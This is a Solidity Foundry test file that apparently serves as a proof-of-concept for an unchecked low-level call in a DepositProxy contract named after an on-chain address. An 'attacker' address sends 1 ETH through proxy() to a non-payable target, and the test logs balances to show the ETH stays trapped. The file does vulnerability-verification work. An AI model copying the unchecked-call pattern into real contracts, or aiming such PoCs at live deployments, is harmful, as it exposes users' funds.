// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0xb11b2fed6c9354f7aa2f658d3b4d7b31d8a13b77.sol";

contract DepositProxyTest is Test {
    DepositProxy proxyContract;
    address owner = address(0x1);
    address attacker = address(0x2);
    
    // Target contract that will fail when receiving ETH
    address failingContract;

    function setUp() public {
        vm.deal(owner, 10 ether);
        vm.deal(attacker, 1 ether);
        
        // Deploy DepositProxy with owner
        vm.prank(owner);
        proxyContract = new DepositProxy{value: 1 ether}();
        
        // Create a contract that will fail when receiving ETH
        failingContract = address(new FailingContract());
    }

    function testUncheckedLowLevelCall() public {
        console.log("--- BEFORE-Trigger State ---");
        uint256 proxyBalanceBefore = proxyContract.getContractBalance();
        uint256 attackerBalanceBefore = attacker.balance;
        uint256 failingContractBalanceBefore = address(failingContract).balance;
        console.log("Proxy contract ETH balance:", proxyBalanceBefore);
        console.log("Attacker ETH balance:", attackerBalanceBefore);
        console.log("Failing contract ETH balance:", failingContractBalanceBefore);

        console.log("--- Trigger Attack ---");
        // Attempt to proxy ETH to failing contract
        bytes memory data = abi.encodeWithSignature("nonExistentFunction()");
        vm.prank(attacker);
        proxyContract.proxy{value: 1 ether}(failingContract, data);
        console.log("Attack executed: proxy called with 1 ETH to failing contract");

        console.log("--- AFTER-Trigger State ---");
        uint256 proxyBalanceAfter = proxyContract.getContractBalance();
        uint256 attackerBalanceAfter = attacker.balance;
        uint256 failingContractBalanceAfter = address(failingContract).balance;
        console.log("Proxy contract ETH balance:", proxyBalanceAfter);
        console.log("Attacker ETH balance:", attackerBalanceAfter);
        console.log("Failing contract ETH balance:", failingContractBalanceAfter);

        // Vulnerability conditions
        bool condition1 = proxyBalanceAfter == proxyBalanceBefore + 1 ether;
        bool condition2 = attackerBalanceAfter == attackerBalanceBefore - 1 ether;
        bool condition3 = failingContractBalanceAfter == failingContractBalanceBefore;
        bool vulnerabilityExists = condition1 && condition2 && condition3;

        console.log("--- Vulnerability Verdict ---");
        console.log("Proxy balance increased by 1 ether:", condition1 ? "YES" : "NO");
        console.log("Attacker balance decreased by 1 ether:", condition2 ? "YES" : "NO");
        console.log("Failing contract balance unchanged:", condition3 ? "YES" : "NO");
        
        if (vulnerabilityExists) {
            console.log("Vulnerability Exists: Unchecked low-level call allowed ETH to be trapped in proxy contract");
        } else {
            console.log("Vulnerability not Exist: Attack failed to create expected balance changes");
        }
    }
}

contract FailingContract {
    function nonExistentFunction() external pure returns (bool) {
        return true;
    }
}